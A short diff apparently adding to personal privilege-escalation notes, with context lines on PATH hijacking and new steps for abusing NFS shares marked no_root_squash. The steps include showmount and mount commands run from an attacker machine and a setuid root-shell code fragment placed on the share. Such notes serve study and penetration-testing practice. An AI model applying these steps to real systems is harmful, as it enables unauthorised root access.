@@ -29,3 +29,16 @@ via $PATH
 3. Add the external binary to one of the editable paths
 4. export PATH='/editable_path':$PATH to add if it's not yet added to $PATH
 5. Run the script in the editable_path
+
+
+via NFS
+
+1. cat etc/exports to view all nfs paths
+2. look for the ones with "no_root_squash" - client's root keeps its full power
+3. try to see if any of the no_root_squash paths are accesible by the current user (mark it as folder A)
+4. on the attacker's machine, showmount -e <target_ip_address> 
+5. on the attacker's machine, mkdir a tmp folder and mount it to folder A
+   mount -o rw <target_ip_address>:<path_folder_A> <path_tmp_on_attacker_machine>
+6. create a script to obtain root shell: setgid(0); setuid(0); system("/bin/bash");, compile it and chmod +s and +x the executable
+7. Place the executable into the tmp folder on attacker's machine
+8. On the target's machine, the executable should show up
